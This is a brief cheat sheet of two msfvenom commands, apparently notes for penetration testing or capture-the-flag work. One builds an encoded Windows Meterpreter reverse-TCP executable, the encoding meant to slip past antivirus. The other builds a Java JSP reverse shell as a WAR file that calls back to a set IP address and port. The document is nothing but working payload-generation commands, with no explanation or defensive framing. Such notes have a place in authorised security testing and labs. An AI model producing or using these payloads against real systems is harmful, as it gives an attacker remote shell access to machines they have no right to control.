# MSFVenom Commands
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.6.30.236 LPORT=4444 -f war > shell.war
```
